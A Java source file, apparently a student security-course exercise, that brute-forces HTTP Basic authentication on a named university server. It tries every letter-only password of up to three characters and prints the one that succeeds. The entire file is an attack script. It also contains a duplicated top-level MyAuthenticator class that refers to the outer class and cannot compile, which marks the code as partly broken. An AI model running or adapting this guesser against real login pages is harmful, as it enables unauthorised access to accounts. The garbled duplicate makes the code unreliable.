import java.net.PasswordAuthentication;
import java.io.IOException;
import java.net.URL;
import java.net.HttpURLConnection;
import java.net.Authenticator;
import java.util.Vector;
public class BruteForce {
    boolean connected;
    int counter;
    String[] chars;
    Vector combinations;
    BruteForce() {
        this.connected = false;
        this.chars = new String[] { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" };
        this.combinations = new Vector();
        this.counter = 0;
        this.genCombinations();
        this.startAttack();
    }
    public void startAttack() {
        while ( this.counter < this.combinations.size() ) {
            this.connected = this.sendRequest();
            if ( this.connected ) {
                System.out.print ( "The password is: " );
                System.out.println ( this.combinations.elementAt ( this.counter - 1 ) );
                this.counter = this.combinations.size();
            }
        }
    }
    public void genCombinations() {
        final String s = new String();
        for ( int i = 0; i < 52; ++i ) {
            this.combinations.addElement ( this.chars[i] );
        }
        for ( int j = 0; j < 52; ++j ) {
            for ( int k = 0; k < 52; ++k ) {
                this.combinations.addElement ( this.chars[j] + this.chars[k] );
            }
        }
        for ( int l = 0; l < 52; ++l ) {
            for ( int n = 0; n < 52; ++n ) {
                for ( int n2 = 0; n2 < 52; ++n2 ) {
                    this.combinations.addElement ( this.chars[l] + this.chars[n] + this.chars[n2] );
                }
            }
        }
    }
    public boolean sendRequest() {
        Authenticator.setDefault ( new MyAuthenticator() );
        try {
            final HttpURLConnection httpURLConnection = ( HttpURLConnection ) new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection();
            httpURLConnection.connect();
            if ( httpURLConnection.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( IOException ex ) {}
        return false;
    }
    public static void main ( final String[] array ) {
        final BruteForce bruteForce = new BruteForce();
    }
    class MyAuthenticator extends Authenticator {
        @Override
        protected PasswordAuthentication getPasswordAuthentication() {
            final String s = "";
            final String s2 = BruteForce.this.combinations.elementAt ( BruteForce.this.counter );
            final BruteForce this$0 = BruteForce.this;
            ++this$0.counter;
            return new PasswordAuthentication ( s, s2.toCharArray() );
        }
    }
}
class MyAuthenticator extends Authenticator {
    @Override
    protected PasswordAuthentication getPasswordAuthentication() {
        final String s = "";
        final String s2 = BruteForce.this.combinations.elementAt ( BruteForce.this.counter );
        final BruteForce this$0 = BruteForce.this;
        ++this$0.counter;
        return new PasswordAuthentication ( s, s2.toCharArray() );
    }
}
